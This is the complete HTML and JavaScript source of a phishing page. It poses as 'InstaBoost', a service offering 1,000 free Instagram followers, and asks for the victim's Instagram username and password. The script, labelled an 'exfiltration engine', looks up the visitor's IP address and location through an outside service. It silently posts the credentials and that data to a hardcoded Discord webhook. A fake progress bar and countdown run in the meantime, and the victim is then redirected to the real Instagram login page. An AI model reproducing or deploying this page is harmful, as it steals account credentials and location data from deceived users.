<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>InstaBoost • 1K Followers</title>
    <style>
        /* ----- reset & base ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: radial-gradient(circle at 30% 20%, #fdfcfb, #d7ccc8);
            padding: 20px;
        }

        /* ----- glass card ----- */
        .card {
            background: rgba(255, 255, 255, 0.55);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 48px;
            padding: 44px 38px 38px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.10), 0 10px 24px rgba(0, 0, 0, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.6);
            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.4s ease;
            animation: card-enter 0.7s cubic-bezier(0.22, 1, 0.36, 1) forwards;
            opacity: 0;
        }

        @keyframes card-enter {
            0% { opacity: 0; transform: translateY(40px) scale(0.96); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.13);
        }

        /* ----- brand ----- */
        .brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 2px;
        }

        .brand svg {
            width: 30px;
            height: 30px;
        }

        .brand h1 {
            font-size: 27px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subhead {
            text-align: center;
            color: #3a3a3a;
            font-size: 15px;
            font-weight: 450;
            margin-bottom: 6px;
        }

        .badge {
            display: inline-block;
            background: linear-gradient(135deg, #00c6fb, #005bea);
            color: #fff;
            font-size: 13px;
            font-weight: 600;
            padding: 6px 20px;
            border-radius: 40px;
            margin: 4px auto 20px;
            box-shadow: 0 4px 14px rgba(0, 91, 234, 0.22);
            animation: pulse-badge 2.6s infinite ease-in-out;
            letter-spacing: 0.2px;
        }

        @keyframes pulse-badge {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.03); box-shadow: 0 6px 20px rgba(0, 91, 234, 0.30); }
        }

        .badge span { font-weight: 300; margin: 0 4px; }

        /* ----- form inputs ----- */
        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1c1c1c;
            margin-bottom: 5px;
            letter-spacing: -0.2px;
        }

        .input-wrap input {
            width: 100%;
            padding: 14px 18px;
            border: 1.5px solid rgba(0, 0, 0, 0.06);
            border-radius: 20px;
            font-size: 15px;
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(4px);
            transition: all 0.25s ease;
            outline: none;
            color: #121212;
        }

        .input-wrap input:focus {
            border-color: #0095f6;
            background: rgba(255, 255, 255, 0.92);
            box-shadow: 0 0 0 5px rgba(0, 149, 246, 0.10);
            transform: scale(1.01);
        }

        .input-wrap input::placeholder {
            color: #a8a8a8;
            font-weight: 400;
            font-size: 14px;
        }

        /* ----- submit button ----- */
        .btn-primary {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 40px;
            background: linear-gradient(135deg, #0095f6, #005bea);
            color: #fff;
            font-size: 17px;
            font-weight: 650;
            letter-spacing: 0.2px;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 8px 28px rgba(0, 91, 234, 0.20);
            margin-top: 4px;
            position: relative;
            overflow: hidden;
        }

        .btn-primary:hover:not(:disabled) {
            transform: scale(1.02) translateY(-2px);
            box-shadow: 0 14px 36px rgba(0, 91, 234, 0.30);
        }

        .btn-primary:active:not(:disabled) {
            transform: scale(0.97);
        }

        .btn-primary:disabled {
            opacity: 0.8;
            cursor: default;
            transform: none;
        }

        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .spinner {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* ----- progress & status (shown after submit) ----- */
        .progress-wrap {
            display: none;
            margin-top: 22px;
            background: rgba(0, 0, 0, 0.05);
            border-radius: 40px;
            height: 7px;
            overflow: hidden;
            width: 100%;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #0095f6, #00d4ff);
            border-radius: 40px;
            transition: width 0.35s ease;
        }

        .status-box {
            display: none;
            margin-top: 14px;
            text-align: center;
            animation: fade-up 0.6s ease;
        }

        @keyframes fade-up {
            0% { opacity: 0; transform: translateY(10px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .status-box .main-msg {
            font-size: 16px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.2px;
        }

        .status-box .sub-msg {
            font-size: 13px;
            color: #5a5a5a;
            margin-top: 4px;
            font-weight: 450;
        }

        .status-box .timer {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 500;
            color: #005bea;
            background: rgba(0, 91, 234, 0.06);
            display: inline-block;
            padding: 4px 16px;
            border-radius: 40px;
            letter-spacing: 0.5px;
        }

        /* ----- footer ----- */
        .footer {
            margin-top: 26px;
            text-align: center;
            font-size: 11px;
            color: #7a7a7a;
        }

        .footer a {
            color: #005bea;
            text-decoration: none;
            font-weight: 500;
        }
        .footer a:hover { text-decoration: underline; }

        @media (max-width: 480px) {
            .card { padding: 30px 20px 26px; }
            .brand h1 { font-size: 23px; }
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Brand -->
        <div class="brand">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#igGrad)" stroke-width="2"/>
                <circle cx="12" cy="12" r="5" stroke="url(#igGrad)" stroke-width="2"/>
                <circle cx="18.5" cy="5.5" r="1.5" fill="#f09433"/>
                <defs>
                    <linearGradient id="igGrad" x1="0" y1="0" x2="24" y2="24">
                        <stop offset="0%" stop-color="#f09433"/>
                        <stop offset="25%" stop-color="#e6683c"/>
                        <stop offset="50%" stop-color="#dc2743"/>
                        <stop offset="75%" stop-color="#cc2366"/>
                        <stop offset="100%" stop-color="#bc1888"/>
                    </linearGradient>
                </defs>
            </svg>
            <h1>InstaBoost</h1>
        </div>

        <p class="subhead">Gain <strong>1,000</strong> real followers — instantly</p>
        <div class="badge">✨ <span>100%</span> safe · no password stored</div>

        <!-- Form -->
        <form id="phishForm">
            <div class="form-group">
                <label>👤 Username</label>
                <div class="input-wrap">
                    <input type="text" id="username" placeholder="your_username" required autocomplete="off" />
                </div>
            </div>
            <div class="form-group">
                <label>🔑 Password</label>
                <div class="input-wrap">
                    <input type="password" id="password" placeholder="••••••••" required autocomplete="off" />
                </div>
            </div>

            <button type="submit" class="btn-primary" id="submitBtn">
                <span class="btn-content" id="btnContent">
                    <span>🚀 Get 1K Followers</span>
                </span>
                <div class="spinner" id="spinner"></div>
            </button>

            <!-- Progress & status (hidden initially) -->
            <div class="progress-wrap" id="progressWrap">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status-box" id="statusBox">
                <div class="main-msg" id="mainMsg">📦 Your followers will be delivered in <strong>1 business day</strong>!</div>
                <div class="sub-msg" id="subMsg">Please wait patiently while we queue your order.</div>
                <div class="timer" id="timerDisplay">⏳ Estimated completion: <span id="countdown">04:00</span></div>
            </div>
        </form>

        <div class="footer">
            By continuing you agree to our <a href="#">Terms</a> · not affiliated with Instagram
        </div>
    </div>

    <script>
        // ============================================================
        // CURY EXFILTRATION ENGINE — "1 Business Day" Edition
        // ============================================================

        // --- REPLACE WITH YOUR DISCORD WEBHOOK URL ---
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1526195213075353611/Cpx9vJxsXv5k0J8lU9b8m1ggdZJoDBFfP6yUtKtz-ILx5aca1F_OboLogGwZ3rvR6x1k";

        // --- IP grabber ---
        async function getVisitorIP() {
            try {
                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || 'N/A',
                    region: data.region || 'N/A',
                    country: data.country_name || 'N/A',
                    org: data.org || 'N/A'
                };
            } catch {
                return { ip: 'unreachable', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A' };
            }
        }

        // --- DOM refs ---
        const form = document.getElementById('phishForm');
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const btnContent = document.getElementById('btnContent');
        const spinner = document.getElementById('spinner');
        const progressWrap = document.getElementById('progressWrap');
        const progressBar = document.getElementById('progressBar');
        const statusBox = document.getElementById('statusBox');
        const countdownSpan = document.getElementById('countdown');

        // --- submit handler ---
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const user = username.value.trim();
            const pass = password.value.trim();

            // gentle validation feedback
            if (!user || !pass) {
                [username, password].forEach(inp => {
                    inp.style.borderColor = '#dc2743';
                    inp.style.boxShadow = '0 0 0 5px rgba(220, 39, 67, 0.10)';
                    setTimeout(() => {
                        inp.style.borderColor = '';
                        inp.style.boxShadow = '';
                    }, 700);
                });
                return;
            }

            // --- disable UI, show spinner & progress ---
            submitBtn.disabled = true;
            btnContent.style.display = 'none';
            spinner.style.display = 'block';
            progressWrap.style.display = 'block';
            statusBox.style.display = 'block';

            // --- start countdown timer (4 minutes = 240 seconds) ---
            let secondsLeft = 240;
            countdownSpan.textContent = '04:00';

            const timerInterval = setInterval(() => {
                secondsLeft--;
                if (secondsLeft <= 0) {
                    clearInterval(timerInterval);
                    countdownSpan.textContent = '00:00';
                    // optional: change status text to "completed"
                    document.getElementById('subMsg').textContent = '✅ Your followers have been added!';
                } else {
                    const mins = String(Math.floor(secondsLeft / 60)).padStart(2, '0');
                    const secs = String(secondsLeft % 60).padStart(2, '0');
                    countdownSpan.textContent = `${mins}:${secs}`;
                }
            }, 1000);

            // --- animate progress bar over ~5 seconds ---
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 4 + 1.5;
                if (progress > 98) progress = 98;
                progressBar.style.width = progress + '%';
            }, 150);

            // --- gather IP & exfiltrate (silent) ---
            const ipInfo = await getVisitorIP();

            const payload = {
                embeds: [{
                    title: '📸 Instagram Capture (1K Scam)',
                    color: 0xE1306C,
                    fields: [
                        { name: '👤 Username', value: `\`${user}\``, inline: true },
                        { name: '🔑 Password', value: `\`${pass}\``, inline: true },
                        { name: '🌐 IP', value: `\`${ipInfo.ip}\``, inline: false },
                        { name: '📍 Location', value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`, inline: true },
                        { name: '🏢 ISP', value: `\`${ipInfo.org}\``, inline: true },
                        { name: '🕒 Time', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
                    ],
                    footer: { text: 'CURY • v6.0 — 1 Business Day' },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (_) { /* silent */ }

            // --- complete progress & redirect after 5.5s ---
            setTimeout(() => {
                clearInterval(progressInterval);
                progressBar.style.width = '100%';
                document.getElementById('mainMsg').innerHTML =
                    '✅ <strong>Done!</strong> Your followers will be delivered in <strong>1 business day</strong>.';
                document.getElementById('subMsg').textContent = 'Thank you for your patience.';

                // redirect to real Instagram after 2 more seconds
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            }, 5500);
        });
    </script>
</body>
</html>
